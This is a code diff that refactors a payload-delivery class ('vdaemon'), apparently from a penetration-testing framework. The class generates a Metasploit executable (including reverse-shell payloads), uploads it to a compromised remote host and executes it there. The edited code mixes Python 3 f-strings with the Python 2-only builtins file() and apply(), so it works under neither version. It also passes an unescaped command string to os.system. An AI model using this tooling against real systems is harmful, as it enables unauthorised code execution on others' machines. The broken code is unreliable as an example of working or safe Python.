@@ -169,27 +169,25 @@ class vdaemon(object):
         """
         temp_dir = tempfile.gettempdir()
         randomness = str(random.randint(0, 293829839))
-        output_filename = os.path.join(temp_dir, 'msf-' + randomness + '.exe')
+        output_filename = os.path.join(temp_dir, f'msf-{randomness}.exe')
 
-        command = '%s %s %s X > %s' % (self._msfpayload_path, payload,
-                                       ' '.join(parameters), output_filename)
+        command = f"{self._msfpayload_path} {payload} {' '.join(parameters)} X > {output_filename}"
+
         os.system(command)
 
         if 'reverse' in payload:
             om.out.console('Remember to setup your firewall to allow the reverse connection!')
 
-        if os.path.isfile(output_filename):
-
-            #    Error handling
-            file_content = file(output_filename).read()
-            for tag in ['Invalid', 'Error']:
-                if tag in file_content:
-                    raise BaseFrameworkException(file_content.strip())
-
-            return output_filename
-        else:
+        if not os.path.isfile(output_filename):
             raise BaseFrameworkException(
                 'Something failed while creating the payload file.')
+        #    Error handling
+        file_content = file(output_filename).read()
+        for tag in ['Invalid', 'Error']:
+            if tag in file_content:
+                raise BaseFrameworkException(file_content.strip())
+
+        return output_filename
 
     def _send_exe_to_server(self, exe_file):
         """
@@ -213,26 +211,25 @@ class vdaemon(object):
         if not transferHandler.can_transfer():
             raise BaseFrameworkException('Can\'t transfer the file to remote host,'
                                 ' can_transfer() returned False.')
+        om.out.debug('The transferHandler can upload files to the remote'
+                     ' end.')
+
+        estimatedTime = transferHandler.estimate_transfer_time(
+            len(exe_file))
+        om.out.debug('The payload transfer will take "' +
+                     str(estimatedTime) + '" seconds.')
+
+        self._remote_filename = get_remote_temp_file(self._exec_method)
+        om.out.debug('Starting payload upload, remote filename is: "' +
+                     self._remote_filename + '".')
+
+        if transferHandler.transfer(file(exe_file).read(), self._remote_filename):
+            om.out.console(
+                'Finished payload upload to "%s"' % self._remote_filename)
+            return self._remote_filename
         else:
-            om.out.debug('The transferHandler can upload files to the remote'
-                         ' end.')
-
-            estimatedTime = transferHandler.estimate_transfer_time(
-                len(exe_file))
-            om.out.debug('The payload transfer will take "' +
-                         str(estimatedTime) + '" seconds.')
-
-            self._remote_filename = get_remote_temp_file(self._exec_method)
-            om.out.debug('Starting payload upload, remote filename is: "' +
-                         self._remote_filename + '".')
-
-            if transferHandler.transfer(file(exe_file).read(), self._remote_filename):
-                om.out.console(
-                    'Finished payload upload to "%s"' % self._remote_filename)
-                return self._remote_filename
-            else:
-                raise BaseFrameworkException(
-                    'The payload upload failed, remote md5sum is different.')
+            raise BaseFrameworkException(
+                'The payload upload failed, remote md5sum is different.')
 
     def _exec_payload(self, remote_file_location):
         """
@@ -249,7 +246,7 @@ class vdaemon(object):
         """
         A wrapper for executing commands
         """
-        om.out.debug('Executing: ' + command)
+        om.out.debug(f'Executing: {command}')
         response = apply(self._exec_method, (command,))
         om.out.debug('"' + command + '" returned: ' + response)
         return response
